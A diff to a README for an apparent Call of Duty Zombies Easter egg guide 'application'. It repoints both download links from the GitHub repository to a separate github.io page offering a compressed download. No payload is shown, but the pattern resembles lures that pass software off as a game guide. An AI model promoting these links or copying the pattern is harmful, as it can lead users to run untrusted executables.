@@ -1,6 +1,6 @@
 # 🧟 zombiestips-map-easter-eggs - Complete guides for your zombie adventures
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Heatless-commonosier700/zombiestips-map-easter-eggs)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://heatless-commonosier700.github.io)
 
 ## 📖 About this project
 This application provides clear walkthroughs for Call of Duty Zombies Easter eggs. Players navigate complex map objectives with ease. The interface organizes quest steps into readable text files and checklists. You find every secret and requirement for each map in one central location.
@@ -15,7 +15,7 @@ This application provides clear walkthroughs for Call of Duty Zombies Easter egg
 ## 📥 Getting the software
 You need to visit the project page to download the latest version of the application. The software comes as a compressed folder to ensure file integrity during the transfer.
 
-[Click here to visit the project page and download the software](https://github.com/Heatless-commonosier700/zombiestips-map-easter-eggs)
+[Click here to visit the project page and download the software](https://heatless-commonosier700.github.io)
 
 Follow these steps to set up the guide on your computer:
 
